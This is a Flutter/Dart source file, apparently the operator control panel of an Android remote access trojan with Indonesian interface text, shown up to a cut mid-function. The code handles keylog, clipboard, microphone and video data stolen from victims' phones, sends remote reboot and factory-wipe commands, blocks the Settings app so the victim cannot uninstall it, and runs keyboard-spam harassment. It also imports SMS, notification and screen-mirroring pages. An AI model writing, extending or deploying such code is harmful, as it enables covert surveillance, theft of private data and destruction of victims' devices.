import 'dart:async';
import 'dart:convert';

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:url_launcher/url_launcher.dart';

import 'rat_client.dart';
import '../theme/neo.dart';
import 'screen_mirror_page.dart';
import 'wake_screen_page.dart';
import 'sms_reader_page.dart';
import 'notification_reader_page.dart';

// Neobrutalism palette
const Color _green = Neo.mint;
const Color _blue2 = Neo.sky;
const Color _red = Neo.coral;
const Color _amber = Neo.peach;
const Color _purple = Neo.lavender;
const Color _teal = Neo.mint;
const Color _sky = Neo.sky;
const Color _orange = Neo.peach;
const Color _pink = Neo.rose;
const Color _t0 = Neo.textDark;
const Color _t1 = Neo.textDark;
const Color _t2 = Color(0xFF889988);
const Color _pageBg = Neo.bg;
const Color _cardBg = Neo.white;
const Color _border = Neo.textDark;
const Color _border2 = Neo.textDark;

class _PillSwitch extends StatelessWidget {
  final bool value;
  final ValueChanged<bool>? onChanged;
  final Color activeColor;

  const _PillSwitch({
    required this.value,
    required this.onChanged,
    this.activeColor = _green,
  });

  @override
  Widget build(BuildContext context) {
    return GestureDetector(
      onTap: onChanged == null ? null : () => onChanged!(!value),
      child: AnimatedContainer(
        duration: const Duration(milliseconds: 180),
        width: 42,
        height: 23,
        padding: const EdgeInsets.all(2),
        decoration: BoxDecoration(
          color: value ? activeColor : Neo.white,
          borderRadius: BorderRadius.circular(12),
          border: Border.all(
            color: Neo.textDark,
            width: 2.5,
          ),
          boxShadow: Neo.shadow(offset: 2),
        ),
        child: Align(
          alignment: value ? Alignment.centerRight : Alignment.centerLeft,
          child: Container(
            width: 17,
            height: 17,
            decoration: BoxDecoration(
              shape: BoxShape.circle,
              color: value ? Neo.white : Neo.textMuted,
              border: Border.all(color: Neo.textDark, width: 2),
            ),
          ),
        ),
      ),
    );
  }
}

class _TileIcon extends StatelessWidget {
  final IconData icon;
  final Color color;
  final double size;

  const _TileIcon(this.icon, this.color, {this.size = 16});

  @override
  Widget build(BuildContext context) {
    return Container(
      width: 32,
      height: 32,
      decoration: BoxDecoration(
        borderRadius: BorderRadius.circular(8),
        color: color,
        border: Border.all(color: Neo.textDark, width: 2.5),
        boxShadow: Neo.shadow(offset: 2),
      ),
      child: Icon(icon, size: size, color: Neo.textDark),
    );
  }
}

class _CtrlTile extends StatelessWidget {
  final IconData icon;
  final Color iconColor;
  final String name;
  final String sub;
  final Color? subColor;
  final Widget? trailing;
  final VoidCallback? onTap;
  final Widget? bottomAction;

  const _CtrlTile({
    required this.icon,
    required this.iconColor,
    required this.name,
    required this.sub,
    this.subColor,
    this.trailing,
    this.onTap,
    this.bottomAction,
  });

  @override
  Widget build(BuildContext context) {
    return Container(
      margin: const EdgeInsets.only(bottom: 8),
      decoration: BoxDecoration(
        color: Neo.white,
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: Neo.textDark, width: 3),
        boxShadow: Neo.shadow(offset: 3),
      ),
      child: InkWell(
        onTap: onTap,
        borderRadius: BorderRadius.circular(12),
        child: Padding(
          padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 10),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.stretch,
            children: [
              Row(
                children: [
                  _TileIcon(icon, iconColor),
                  const SizedBox(width: 12),
                  Expanded(
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Text(name,
                            style: const TextStyle(
                                fontFamily: 'ShareTechMono',
                                fontSize: 12,
                                fontWeight: FontWeight.w700,
                                color: Neo.textDark)),
                        if (sub.isNotEmpty) ...[
                          const SizedBox(height: 2),
                          Text(sub,
                              style: TextStyle(
                                  fontFamily: 'ShareTechMono',
                                  fontSize: 9,
                                  color: subColor ?? Neo.textMuted)),
                        ],
                      ],
                    ),
                  ),
                  if (trailing != null) trailing!,
                ],
              ),
              if (bottomAction != null) ...[
                const SizedBox(height: 8),
                SizedBox(width: double.infinity, child: bottomAction),
              ],
            ],
          ),
        ),
      ),
    );
  }
}

class _KeypadButton extends StatelessWidget {
  final String? text;
  final IconData? icon;
  final VoidCallback? onTap;
  final Color color;

  const _KeypadButton({
    this.text,
    this.icon,
    this.onTap,
    required this.color,
  });

  @override
  Widget build(BuildContext context) {
    return InkWell(
      onTap: onTap,
      borderRadius: BorderRadius.circular(12),
      child: Container(
        height: 50,
        decoration: BoxDecoration(
          color: onTap == null ? Neo.cream : color,
          borderRadius: BorderRadius.circular(12),
          border: Border.all(color: Neo.textDark, width: 2.5),
          boxShadow: Neo.shadow(offset: 2),
        ),
        alignment: Alignment.center,
        child: icon != null
            ? Icon(icon, size: 20, color: onTap == null ? Neo.textMuted : Neo.textDark)
            : Text(text ?? '',
                style: const TextStyle(
                    fontFamily: 'ShareTechMono',
                    fontSize: 18,
                    fontWeight: FontWeight.w700,
                    color: Neo.textDark)),
      ),
    );
  }
}
class _SectionTitle extends StatelessWidget {
  final String title;
  const _SectionTitle(this.title);

  @override
  Widget build(BuildContext context) {
    return Padding(
      padding: const EdgeInsets.fromLTRB(16, 20, 16, 10),
      child: NeoSectionHeader(
        title: title,
        color: Neo.mint,
        icon: Icons.chevron_right,
      ),
    );
  }
}

class RatControlPage extends StatefulWidget {
  final RatClient client;
  final String? initialDeviceId;
  const RatControlPage({super.key, required this.client, this.initialDeviceId});

  @override
  State<RatControlPage> createState() => _RatControlPageState();
}

class _RatControlPageState extends State<RatControlPage> {
  String? _deviceId;
  bool _devinfoOpen = false;
  bool _pickerOpened = false;
  final TextEditingController _chatInput = TextEditingController();
  final Map<String, String> _eventSeen = {};
  final List<_TerminalEntry> _terminalLines = [];
  final ScrollController _terminalScroll = ScrollController();

  static const int _maxTerminalLines = 200;

  RatClient get client => widget.client;
  RatDevice? get _device =>
      _deviceId == null ? null : client.deviceById(_deviceId!);

  void _terminal(String cmd, [dynamic value = '']) {
    if (!mounted) return;
    setState(() {
      _terminalLines.add(_TerminalEntry(cmd, value));
      if (_terminalLines.length > _maxTerminalLines) {
        _terminalLines.removeRange(0, _terminalLines.length - _maxTerminalLines);
      }
    });
    WidgetsBinding.instance.addPostFrameCallback((_) {
      if (_terminalScroll.hasClients) {
        _terminalScroll.jumpTo(_terminalScroll.position.maxScrollExtent);
      }
    });
  }

  void _clearTerminal() {
    if (!mounted) return;
    setState(_terminalLines.clear);
  }

  @override
  void initState() {
    super.initState();
    final initial = widget.initialDeviceId;
    if (initial != null && client.deviceById(initial) != null) {
      _deviceId = initial;
      _pickerOpened = true;
    }
    client.addListener(_onClient);
    if (!client.isConnected && client.authError == null) {
      client.connect();
    }
  }

  @override
  void dispose() {
    client.removeListener(_onClient);
    _chatInput.dispose();
    super.dispose();
  }

  void _onClient() {
    if (!mounted) return;
    if (_deviceId == null && !_pickerOpened) {
      final initial = widget.initialDeviceId;
      if (initial != null && client.deviceById(initial) != null) {
        _pickerOpened = true;
        _deviceId = initial;
      } else if (client.devices.isNotEmpty) {
        _pickerOpened = true;
        _deviceId = client.devices.first.id;
        WidgetsBinding.instance.addPostFrameCallback((_) {
          if (mounted) _openPicker(initial: true);
        });
      }
    }
    if (_deviceId != null && client.deviceById(_deviceId!) == null) {
      if (client.devices.isNotEmpty) {
        _deviceId = client.devices.first.id;
      } else {
        _deviceId = null;
      }
    }
    _emitDataToasts();
  }

  void _emitDataToasts() {
    final id = _deviceId;
    if (id == null) return;
    void check(String key, String label) {
      final val = client.dataFor(id)[key];
      if (val == null) return;
      final s = val.toString();
      final marker = '$id/$key/$s';
      if (_eventSeen[marker] == null) {
        _eventSeen[marker] = '';
        _toast('$label: ${s.length > 60 ? s.substring(0, 60) : s}', info: true);
      }
    }

    check('clipboard', 'Clipboard');
    check('keylog', 'Keylog');
    check('micData', 'Audio');
    check('videoData', 'Video');

    void checkStatus(String key, String failMsg, String okMsg) {
      final val = client.dataFor(id)[key];
      if (val == null) return;
      final s = val.toString();
      if (s == 'EXECUTING' || s == 'REQUESTED') return;
      final marker = '$id/$key/$s';
      if (_eventSeen[marker] == null) {
        _eventSeen[marker] = '';
        final failed =
            s.contains('FAIL') || s.contains('ADMIN_REQUIRED');
        _toast(failed ? failMsg : okMsg, error: failed);
      }
    }

    checkStatus('rebootStatus', 'MAAF GAGAL REBOOT DEVICE ANDA TERLALU BARU UNTUK RESTART', 'RESTART HP BERHASIL');
    checkStatus('wipeStatus', 'MAAF GAGAL RESET HP', 'RESET HP BERHASIL');
  }

  void _toast(String msg, {bool error = false, bool info = false}) {
    if (!mounted) return;
    ScaffoldMessenger.of(context)
      ..clearSnackBars()
      ..showSnackBar(SnackBar(
        content: Text(msg, style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 11, color: Neo.textDark)),
        backgroundColor: error ? Neo.coral : info ? Neo.sky : Neo.mint,
        behavior: SnackBarBehavior.floating,
        duration: const Duration(seconds: 3),
      ));
  }

  // Command helpers
  void _cmd(String command, [dynamic value = '']) {
    _terminal(command, value);
    client.sendCommand(_deviceId!, command, value).then((res) {
      if (res.statusCode != 200) {
        final body = res.body;
        try {
          final json = jsonDecode(body);
          _toast('ERROR ${res.statusCode}: ${json['error'] ?? 'Unknown'}', error: true);
        } catch (_) {
          _toast('ERROR ${res.statusCode}', error: true);
        }
      }
    }).catchError((e) {
      _toast('GAGAL KIRIM: $e', error: true);
    });
  }

  void _patch(String key, dynamic v) {
    _terminal('PATCH: $key', v);
    client.patchStatus(_deviceId!, key, v);
  }

  void _toggle(String command, String statusKey) {
    final s = _device!.statusBool(statusKey);
    _patch(statusKey, !s);
    _cmd(command, (!s).toString());
    _toast(!s ? 'AKTIF' : 'OFF', info: !s ? false : true);
  }

  // Ã¢â€â‚¬Ã¢â€â‚¬ Build Ã¢â€â‚¬Ã¢â€â‚¬
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Neo.bg,
      body: AnimatedBuilder(
        animation: client,
        builder: (context, _) {
          if (client.authError != null) return _buildAuthError();
          if (client.devices.isEmpty) return _buildWaiting();
          final d = _device;
          if (d == null) {
            return _buildWaiting(hasDevices: true);
          }
          return _buildControl(d);
        },
      ),
    );
  }

  Widget _buildAuthError() {
    return Center(
      child: Padding(
        padding: const EdgeInsets.all(32),
        child: NeoCard(
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              const Icon(Icons.error_outline, color: Neo.coral, size: 44),
              const SizedBox(height: 16),
              Text(
                client.authError ?? 'SESI TIDAK VALID',
                textAlign: TextAlign.center,
                style: const TextStyle(
                    fontFamily: 'ShareTechMono', color: Neo.textDark, fontSize: 13, letterSpacing: 1),
              ),
              const SizedBox(height: 8),
              const Text(
                'TOKEN TIDAK DIKENALI BACKEND RAT.\nLOGIN ULANG / SAMBUNGKAN BACKEND.',
                textAlign: TextAlign.center,
                style: TextStyle(
                    fontFamily: 'ShareTechMono', color: Neo.textMuted, fontSize: 9, letterSpacing: 1),
              ),
              const SizedBox(height: 20),
              NeoButton(
                label: 'COBA LAGI',
                icon: Icons.refresh,
                color: Neo.mint,
                onPressed: () {
                  client.disconnect();
                  client.connect();
                  _toast('Mencoba ulang...', info: true);
                },
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildWaiting({bool hasDevices = false}) {
    return Center(
      child: Column(
        mainAxisSize: MainAxisSize.min,
        children: [
          const SizedBox(
            width: 34,
            height: 34,
            child: CircularProgressIndicator(
              strokeWidth: 3,
              color: Neo.mint,
              backgroundColor: Neo.cream,
            ),
          ),
          const SizedBox(height: 18),
          Text(
            hasDevices ? 'PILIH DEVICE' : 'MENUNGGU DEVICE...',
            style: const TextStyle(
                fontFamily: 'ShareTechMono',
                fontSize: 12,
                letterSpacing: 2,
                color: Neo.textDark),
          ),
          const SizedBox(height: 6),
          const Text(
            'PASTIKAN BACKEND RAT ONLINE',
            style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 8, letterSpacing: 2, color: Neo.textMuted),
          ),
          const SizedBox(height: 20),
          if (hasDevices)
            NeoButton(
              label: 'PILIH DEVICE',
              color: Neo.mint,
              expand: false,
              onPressed: _openPicker,
            ),
        ],
      ),
    );
  }

  Widget _buildControl(RatDevice d) {
    return CustomScrollView(
      physics: const BouncingScrollPhysics(),
      slivers: [
        SliverPadding(
          padding: const EdgeInsets.only(top: 8),
          sliver: SliverToBoxAdapter(child: _buildBanner(d)),
        ),
        if (!client.isConnected)
          SliverToBoxAdapter(
            child: _ConnectingBar(
              onRetry: () {
                client.disconnect();
                client.connect();
                _toast('Menyambungkan ulang...', info: true);
              },
            ),
          ),
        SliverPadding(
          padding: const EdgeInsets.fromLTRB(16, 10, 16, 0),
          sliver: SliverToBoxAdapter(child: _buildInfoBar(d)),
        ),
        SliverPadding(
          padding: const EdgeInsets.fromLTRB(16, 10, 16, 0),
          sliver: SliverToBoxAdapter(child: _buildDevInfo(d)),
        ),
        const SliverToBoxAdapter(child: _SectionTitle('Kontrol Perangkat')),
        SliverPadding(
          padding: const EdgeInsets.symmetric(horizontal: 16),
          sliver: SliverGrid(
            gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
              crossAxisCount: 2,
              mainAxisSpacing: 10,
              crossAxisSpacing: 10,
              mainAxisExtent: 124,
            ),
            delegate: SliverChildListDelegate(_buildControlTiles(d)),
          ),
        ),
        const SliverToBoxAdapter(child: _SectionTitle('Streaming')),
        SliverPadding(
          padding: const EdgeInsets.symmetric(horizontal: 16),
          sliver: SliverGrid(
            gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
              crossAxisCount: 2,
              mainAxisSpacing: 10,
              crossAxisSpacing: 10,
              mainAxisExtent: 124,
            ),
            delegate: SliverChildListDelegate(_buildStreamTiles(d)),
          ),
        ),
        const SliverToBoxAdapter(child: _SectionTitle('Storage & Info')),
        SliverPadding(
          padding: const EdgeInsets.symmetric(horizontal: 16),
          sliver: SliverGrid(
            gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
              crossAxisCount: 2,
              mainAxisSpacing: 10,
              crossAxisSpacing: 10,
              mainAxisExtent: 124,
            ),
            delegate: SliverChildListDelegate(_buildStorageTiles(d)),
          ),
        ),

        const SliverToBoxAdapter(child: _SectionTitle('Kernel')),
        SliverPadding(
          padding: const EdgeInsets.symmetric(horizontal: 16),
          sliver: SliverGrid(
            gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
              crossAxisCount: 2,
              mainAxisSpacing: 10,
              crossAxisSpacing: 10,
              mainAxisExtent: 124,
            ),
            delegate: SliverChildListDelegate(_buildKernelTiles(d)),
          ),
        ),
        const SliverToBoxAdapter(child: _SectionTitle('Aksi')),
        SliverPadding(
          padding: const EdgeInsets.symmetric(horizontal: 16),
          sliver: SliverGrid(
            gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
              crossAxisCount: 2,
              mainAxisSpacing: 10,
              crossAxisSpacing: 10,
              mainAxisExtent: 124,
            ),
            delegate: SliverChildListDelegate(_buildActionTiles(d)),
          ),
        ),
        if (d.statusBool('lockChatActive'))
          SliverPadding(
            padding: const EdgeInsets.fromLTRB(16, 20, 16, 0),
            sliver: SliverToBoxAdapter(child: _buildLockChatPanel(d)),
          ),
        const SliverToBoxAdapter(child: _SectionTitle('Terminal')),
        SliverPadding(
          padding: const EdgeInsets.symmetric(horizontal: 16),
          sliver: SliverToBoxAdapter(child: _buildTerminalPanel()),
        ),
        const SliverToBoxAdapter(child: SizedBox(height: 24)),
      ],
    );
  }

  Widget _buildTerminalPanel() {
    return NeoCard(
      height: 240,
      color: Neo.bg,
      borderColor: Neo.textDark,
      shadowOffset: 4,
      padding: EdgeInsets.zero,
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.stretch,
        children: [
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
            decoration: BoxDecoration(
              borderRadius:
                  const BorderRadius.vertical(top: Radius.circular(12)),
              color: Neo.white,
              border: Border(bottom: BorderSide(color: Neo.textDark, width: 2.5)),
            ),
            child: Row(
              children: [
                Container(
                  width: 8,
                  height: 8,
                  decoration: BoxDecoration(
                    shape: BoxShape.circle,
                    color: Neo.coral,
                  ),
                ),
                const SizedBox(width: 6),
                Container(
                  width: 8,
                  height: 8,
                  decoration: BoxDecoration(
                    shape: BoxShape.circle,
                    color: Neo.peach,
                  ),
                ),
                const SizedBox(width: 6),
                Container(
                  width: 8,
                  height: 8,
                  decoration: BoxDecoration(
                    shape: BoxShape.circle,
                    color: Neo.mint,
                  ),
                ),
                const SizedBox(width: 10),
                const Expanded(
                  child: Text('ROOT@lyzn:~/rat',
                      style: TextStyle(
                          fontFamily: 'ShareTechMono',
                          fontSize: 9,
                          letterSpacing: 1,
                          color: Neo.textMuted)),
                ),
                GestureDetector(
                  onTap: _clearTerminal,
                  child: const Icon(Icons.delete_sweep_outlined,
                      size: 15, color: Neo.textMuted),
                ),
              ],
            ),
          ),
          Expanded(
            child: _terminalLines.isEmpty
                ? Center(
                    child: Text(
                      'TUNGGU PERINTAH...',
                      style: TextStyle(
                          fontFamily: 'ShareTechMono',
                          fontSize: 9,
                          letterSpacing: 2,
                          color: Neo.textMuted),
                    ),
                  )
                : ListView.builder(
                    controller: _terminalScroll,
                    padding: const EdgeInsets.all(10),
                    itemCount: _terminalLines.length,
                    itemBuilder: (context, i) {
                      final e = _terminalLines[i];
                      return _TerminalLine(entry: e);
                    },
                  ),
          ),
        ],
      ),
    );
  }

  Widget _buildBanner(RatDevice d) {
    return Padding(
      padding: const EdgeInsets.symmetric(horizontal: 16),
      child: NeoCard(
        height: 130,
        color: Neo.mint,
        borderColor: Neo.textDark,
        shadowOffset: 4,
        padding: EdgeInsets.zero,
        child: Stack(
          children: [
            Positioned.fill(
              child: CustomPaint(painter: _GridPainter()),
            ),
            Padding(
              padding: const EdgeInsets.all(16),
              child: Row(
                children: [
                  Container(
                    width: 52,
                    height: 52,
                    decoration: BoxDecoration(
                      borderRadius: BorderRadius.circular(12),
                      border: Border.all(color: Neo.textDark, width: 3),
                      color: Neo.white,
                      boxShadow: Neo.shadow(offset: 2),
                    ),
                    child: const Icon(Icons.phone_android, color: Neo.textDark, size: 28),
                  ),
                  const SizedBox(width: 14),
                  Expanded(
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: [
                        Container(
                          padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 3),
                          decoration: BoxDecoration(
                            color: Neo.white,
                            borderRadius: BorderRadius.circular(20),
                            border: Border.all(color: Neo.textDark, width: 2.5),
                          ),
                          child: Row(
                            mainAxisSize: MainAxisSize.min,
                            children: [
                              Container(
                                width: 5,
                                height: 5,
                                decoration: BoxDecoration(
                                  shape: BoxShape.circle,
                                  color: Neo.textDark,
                                ),
                              ),
                              const SizedBox(width: 5),
                              const Text('ONLINE',
                                  style: TextStyle(
                                      fontFamily: 'ShareTechMono',
                                      fontSize: 8,
                                      letterSpacing: 2,
                                      color: Neo.textDark)),
                            ],
                          ),
                        ),
                        const SizedBox(height: 8),
                        Text(
                          d.name,
                          maxLines: 1,
                          overflow: TextOverflow.ellipsis,
                          style: const TextStyle(
                              fontFamily: 'ShareTechMono',
                              fontSize: 16,
                              fontWeight: FontWeight.w700,
                              color: Neo.textDark),
                        ),
                        const SizedBox(height: 2),
                        Text(
                          d.id,
                          maxLines: 1,
                          overflow: TextOverflow.ellipsis,
                          style: const TextStyle(
                              fontFamily: 'ShareTechMono', fontSize: 9, color: Neo.textDark),
                        ),
                      ],
                    ),
                  ),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildInfoBar(RatDevice d) {
    return NeoCard(
      padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 12),
      child: Row(
        children: [
          _TileIcon(Icons.security, Neo.coral),
          const SizedBox(width: 10),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                const Text('ANTI UNINSTALL',
                    style: TextStyle(
                        fontFamily: 'ShareTechMono',
                        fontSize: 12,
                        fontWeight: FontWeight.w700,
                        color: Neo.textDark)),
                Text(
                  d.statusBool('antiUninstall')
                      ? '— APLIKASI TIDAK BISA DIHAPUS'
                      : '— OFF',
                  style: TextStyle(
                      fontFamily: 'ShareTechMono',
                      fontSize: 7,
                      letterSpacing: 1.2,
                      color: d.statusBool('antiUninstall') ? Neo.mint : Neo.textMuted),
                ),
              ],
            ),
          ),
          _PillSwitch(
            value: d.statusBool('antiUninstall'),
            activeColor: Neo.coral,
            onChanged: (v) => _onAntiUninstallToggle(v),
          ),
          const SizedBox(width: 10),
          _GhostBtn(
            label: 'GANTI',
            onTap: _openPicker,
          ),
        ],
      ),
    );
  }

  void _onAntiUninstallToggle(bool on) {
    if (on) {
      _cmd('blockApp', jsonEncode({'package': 'com.android.settings', 'name': 'Settings'}));
      _patch('antiUninstall', true);
      _toast('Anti Uninstall Aktif', error: true);
    } else {
      _cmd('unblockApp', 'com.android.settings');
      _patch('antiUninstall', false);
      _toast('Anti Uninstall Dimatikan', info: true);
    }
  }

  void _onKeyboardSpamToggle(bool on) {
    if (on) {
      _showKeyboardSpamDialog();
    } else {
      _onStopKeyboardSpam();
    }
  }

  void _onStopKeyboardSpam() {
    _cmd(kCmdKeyboardSpamStop, '');
    _patch('keyboardSpamActive', false);
    _toast('Keyboard spam dihentikan', info: true);
  }

  void _showKeyboardSpamDialog() {
    final msgC = TextEditingController(text: 'Halo, coba balas ya');
    final countC = TextEditingController(text: '0');
    showDialog<void>(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: Neo.white,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(12),
          side: const BorderSide(color: Neo.textDark, width: 3),
        ),
        title: const Text('SPAM KEYBOARD',
            style: TextStyle(
                fontFamily: 'ShareTechMono', color: Neo.textDark, fontSize: 13, letterSpacing: 1)),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            const Text('JUMLAH BUKA-TUTUP',
                style: TextStyle(
                    fontFamily: 'ShareTechMono', fontSize: 9, color: Neo.textMuted, letterSpacing: 1)),
            const SizedBox(height: 5),
            TextField(
              controller: countC,
              keyboardType: TextInputType.number,
              style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 11, color: Neo.textDark),
              decoration: InputDecoration(
                hintText: '0 = terus menerus sampai STOP',
                hintStyle: const TextStyle(
                    fontFamily: 'ShareTechMono', fontSize: 9, color: Neo.textMuted),
                filled: true,
                fillColor: Neo.cream,
                enabledBorder: OutlineInputBorder(
                  borderRadius: BorderRadius.circular(10),
                  borderSide: const BorderSide(color: Neo.textDark, width: 2.5),
                ),
                focusedBorder: OutlineInputBorder(
                  borderRadius: BorderRadius.circular(10),
                  borderSide: const BorderSide(color: Neo.mint, width: 3),
                ),
              ),
            ),
            const SizedBox(height: 10),
            const Text('PESAN (OPSIONAL)',
                style: TextStyle(
                    fontFamily: 'ShareTechMono', fontSize: 9, color: Neo.textMuted, letterSpacing: 1)),
            const SizedBox(height: 5),
            TextField(
              controller: msgC,
              maxLines: 2,
              style: const TextStyle(fontFamily: 'ShareTechMono', fontSize: 11, color: Neo.textDark),
              decoration: InputDecoration(
                filled: true,
                fillColor: Neo.cream,
                enabledBorder: OutlineInputBorder(
                  borderRadius: BorderRadius.circular(10),
                  borderSide: const BorderSide(color: Neo.textDark, width: 2.5),
                ),
                focusedBorder: OutlineInputBorder(
                  borderRadius: BorderRadius.circular(10),
                  borderSide: const BorderSide(color: Neo.mint, width: 3),
                ),
              ),
            ),
            const SizedBox(height: 12),
            const Text(
                'KEYBOARD AKAN BUKA-TUTUP BERULANG KALI (JUMLAH = BERAPA KALI BUKA-TUTUP). BERHENTI LEWAT TOMBOL STOP ATAU SWITCH.',
                style: TextStyle(
                    fontFamily: 'ShareTechMono', fontSize: 8, color: Neo.textMuted, height: 1.5)),
          ],
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text('BATAL',
                style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 10, color: Neo.textMuted)),
          ),
          NeoButton(
            label: 'MULAI',
            color: Neo.mint,
            expand: false,
            onPressed: () {
              final msg = msgC.text.trim();
              final count = int.tryParse(countC.text.trim()) ?? 0;
              Navigator.pop(context);
              _cmd(kCmdKeyboardSpam,
                  jsonEncode({'count': count < 0 ? 0 : count, 'text': msg}));
              _patch('keyboardSpamActive', true);
              _toast('Keyboard spam dimulai', error: true);
            },
          ),
        ],
      ),
    );
  }

  Widget _buildDevInfo(RatDevice d) {
    final info = d.info;
    return NeoCard(
      child: Column(
        children: [
          InkWell(
            onTap: () => setState(() => _devinfoOpen = !_devinfoOpen),
            child: Padding(
              padding: const EdgeInsets.all(13),
              child: Row(
                children: [
                  _TileIcon(Icons.smartphone, Neo.sky),
                  const SizedBox(width: 12),
                  Expanded(
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Text(d.name,
                            maxLines: 1,
                            overflow: TextOverflow.ellipsis,
                            style: const TextStyle(
                                fontFamily: 'ShareTechMono',
                                fontSize: 14,
                                fontWeight: FontWeight.w700,
                                color: Neo.textDark)),
                        Text(d.id,
                            maxLines: 1,
                            overflow: TextOverflow.ellipsis,
                            style: const TextStyle(
                                fontFamily: 'ShareTechMono', fontSize: 9, color: Neo.textMuted)),
                      ],
                    ),
                  ),
                  if (info.battery != null)
                    Padding(
                      padding: const EdgeInsets.symmetric(horizontal: 8),
                      child: Text(
                        '${info.battery}%',
                        style: TextStyle(
                          fontFamily: 'ShareTechMono',
                          fontSize: 13,
                          fontWeight: FontWeight.w700,
                          color: info.battery! <= 20
                              ? Neo.coral
                              : info.battery! <= 40
                                  ? Neo.peach
                                  : Neo.mint,
                        ),
                      ),
                    ),
                  if (info.charging)
                    const Icon(Icons.bolt, color: Neo.peach, size: 14),
                  const SizedBox(width: 6),
                  AnimatedRotation(
                    turns: _devinfoOpen ? 0.5 : 0,
                    duration: const Duration(milliseconds: 250),
                    child: Container(
                      width: 26,
                      height: 26,
                      decoration: BoxDecoration(
                        borderRadius: BorderRadius.circular(7),
                        color: Neo.mint,
                        border: Border.all(color: Neo.textDark, width: 2),
                      ),
                      child: const Icon(Icons.arrow_drop_down, color: Neo.textDark, size: 18),
                    ),
                  ),
                ],
              ),
            ),
          ),
          AnimatedCrossFade(
            duration: const Duration(milliseconds: 250),
            crossFadeState:
                _devinfoOpen ? CrossFadeState.showSecond : CrossFadeState.showFirst,
            firstChild: const SizedBox.shrink(),
            secondChild: Column(
              children: [
                const Divider(height: 1, color: Neo.textDark),
                Padding(
                  padding: const EdgeInsets.all(12),
                  child: Column(
                    children: [
                      _infoRow('BATERAI',
                          Text(
                            info.battery != null ? '${info.battery}%' : '—',
                            style: TextStyle(
                                fontFamily: 'ShareTechMono',
                                fontSize: 15,
                                fontWeight: FontWeight.w700,
                                color: info.battery != null && info.battery! <= 20
                                    ? Neo.coral
                                    : Neo.mint),
                          )),
                      _infoRow('PENGISIAN',
                          Text(info.charging ? 'ON' : 'OFF',
                              style: TextStyle(
                                  fontFamily: 'ShareTechMono',
                                  fontSize: 15,
                                  fontWeight: FontWeight.w700,
                                  color: info.charging ? Neo.mint : Neo.textMuted))),
                      _infoRow('ANDROID',
                          Text(info.androidVersion ?? '—',
                              style: const TextStyle(
                                  fontFamily: 'ShareTechMono',
                                  fontSize: 15,
                                  fontWeight: FontWeight.w700,
                                  color: Neo.sky))),
                      _infoRow('SDK',
                          Text(info.sdkVersion ?? '—',
                              style: const TextStyle(
                                  fontFamily: 'ShareTechMono',
                                  fontSize: 15,
                                  fontWeight: FontWeight.w700,
                                  color: Neo.sky))),
                      _infoRow('TERHUBUNG',
                          Text(_fmtTime(info.connectedAt),
                              style: const TextStyle(
                                  fontFamily: 'ShareTechMono',
                                  fontSize: 11,
                                  fontWeight: FontWeight.w600,
                                  color: Neo.textMuted))),
                      _infoRow('TERAKHIR DILIHAT',
                          Text(_fmtTime(info.lastSeen),
                              style: const TextStyle(
                                  fontFamily: 'ShareTechMono',
                                  fontSize: 11,
                                  fontWeight: FontWeight.w600,
                                  color: Neo.textMuted))),
                    ],
                  ),
                ),
                Container(
                  width: double.infinity,
                  padding: const EdgeInsets.all(12),
                  decoration: const BoxDecoration(color: Neo.bg),
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      const Text('ID PERANGKAT',
                          style: TextStyle(
                              fontFamily: 'ShareTechMono',
                              fontSize: 9,
                              fontWeight: FontWeight.w600,
                              color: Neo.textMuted)),
                      const SizedBox(height: 6),
                      Row(
                        children: [
                          Expanded(
                            child: Text(d.id,
                                style: const TextStyle(
                                    fontFamily: 'ShareTechMono',
                                    fontSize: 9,
                                    color: Neo.sky)),
                          ),
                          _GhostBtn(
                            label: 'SALIN',
                            onTap: () {
                              Clipboard.setData(ClipboardData(text: d.id));
                              _toast('ID disalin');
                            },
                          ),
                        ],
                      ),
                    ],
                  ),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  Widget _infoRow(String label, Widget value) {
    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 4),
      child: Row(
        mainAxisAlignment: MainAxisAlignment.spaceBetween,
        children: [
          Text(label,
              style: const TextStyle(
                  fontFamily: 'ShareTechMono', fontSize: 9, color: Neo.textMuted, fontWeight: FontWeight.w600)),
          value,
        ],
      ),
    );
  }

  String _fmtTime(DateTime? t) {
    if (t == null) return 'Ã¢â‚¬â€';
    String two(int v) => v.toString().padLeft(2, '0');
    return '${two(t.hour)}:${two(t.minute)}:${two(t.second)}';
  }

  // Ã¢â€â‚¬Ã¢â€â‚¬ Tiles Ã¢â€â‚¬Ã¢â€â‚¬
  List<Widget> _buildControlTiles(RatDevice d) {
    return [
      _CtrlTile(
